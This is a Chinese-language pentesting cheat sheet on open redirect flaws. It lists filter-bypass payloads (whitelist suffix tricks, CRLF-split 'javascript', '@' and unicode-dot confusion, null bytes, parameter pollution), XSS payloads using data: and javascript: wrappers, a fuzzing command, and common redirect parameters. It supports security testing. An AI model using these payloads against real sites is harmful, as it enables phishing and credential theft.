# 任意URL跳转

> 当web应用程序接受不受信任的输入时，可能会导致web应用程序将请求重定向到不受信任的输入中包含的URL，这时可以进行未验证的重定向和转发。通过修改恶意站点的不可信URL输入，攻击者可以成功地发起钓鱼欺诈并窃取用户凭证。因为修改链接中的服务器名与原始站点相同，所以钓鱼链接攻击可能会有更可信的外观。未经验证的重定向和转发攻击还可用于恶意地创建一个URL，该URL将通过应用程序的访问控制检查，然后将攻击者转发到他们通常无法访问的特权函数。
>

## Summary

- [Exploitation](#exploitation)
- [HTTP Redirection Status Code - 3xx](#http-redirection-status-code---3xx)
- [Fuzzing](#fuzzing)
- [Filter Bypass](#filter-bypass)
- [Common injection parameters](#common-injection-parameters)
- [References](#references)

## Exploitation

假设有一个 `well known` 的网站 - https://famous-website.tld/. 让我们假设有一个这样的链接：

```powershell
https://famous-website.tld/signup?redirectUrl=https://famous-website.tld/account
```
注册后你会被重定向到你的账户，此重定向由URL中的 `redirectUrl` 参数指定。

如果我们把 `famous-website.tld/account` 改为`evil-website.tld`会发生什么呢?

```powerhshell
https://famous-website.tld/signup?redirectUrl=https://evil-website.tld/account
```

通过访问这个URL，如果在我们注册后被重定向到 `evil-website.tld`，我们就有了一个任意跳转的重定向漏洞。这可能被攻击者用来显示一个钓鱼页面，要求您输入您的凭证。


## HTTP Redirection Status Code - 3xx

- [300 Multiple Choices](https://httpstatuses.com/300)
- [301 Moved Permanently](https://httpstatuses.com/301)
- [302 Found](https://httpstatuses.com/302)
- [303 See Other](https://httpstatuses.com/303)
- [304 Not Modified](https://httpstatuses.com/304)
- [305 Use Proxy](https://httpstatuses.com/305)
- [307 Temporary Redirect](https://httpstatuses.com/307)
- [308 Permanent Redirect](https://httpstatuses.com/308)

## Fuzzing

在您的测试用例中，用一个特定的白名单从 *Open-Redirect-payloads.txt*替换为 www.whitelisteddomain.tld 。

要做到这一点，只需将带有值www.test.com的WHITELISTEDDOMAIN修改为您的测试用例URL。

```powershell
WHITELISTEDDOMAIN="www.test.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
```

## Filter Bypass

使用白名单或关键字

```powershell
www.whitelisted.com.evil.com redirect to evil.com
```

使用 CRLF 绕过 “javascript” 黑名单关键字

```powershell
java%0d%0ascript%0d%0a:alert(0)
```

使用 "//" 绕过 "http" 黑名单关键字

```powershell
//google.com
```

使用 "https:" 绕过 "//" 黑名单关键字

```powershell
https:google.com
```

使用 "\/\/" 绕过 "//" 黑名单关键字 (浏览器会将 \/\/ 识别为 //)

```powershell
\/\/google.com/
/\/google.com/
```

使用 "%E3%80%82" 绕过 "." 黑名单字符

```powershell
/?redir=google。com
//google%E3%80%82com
```

使用空子节 "%00" 绕过黑名单过滤器

```powershell
//google%00.com
```

使用参数污染

```powershell
?next=whitelisted.com&next=google.com
```

使用 "@" 字符，浏览器会重定向到“@”之后的任何内容

```powershell
http://www.theirsite.com@yoursite.com/
```

创建文件夹作为它们的域

```powershell
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

使用XSS在任意URL -如果它是在一个JS变量

```powershell
";alert(0);//
```

XSS from data:// wrapper

```powershell
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```

XSS from javascript:// wrapper

```powershell
http://www.example.com/redirect.php?url=javascript:prompt(1)
```

## Common injection parameters

```powershell
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```

## References

* filedescriptor
* [You do not need to run 80 reconnaissance tools to get access to user accounts - @stefanocoding](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
* [OWASP - Unvalidated Redirects and Forwards Cheat Sheet](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
* [Cujanovic - Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
* [Pentester Land - Open Redirect Cheat Sheet](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
* [Open Redirect Vulnerability - AUGUST 15, 2018 - s0cket7](https://s0cket7.com/open-redirect-vulnerability/)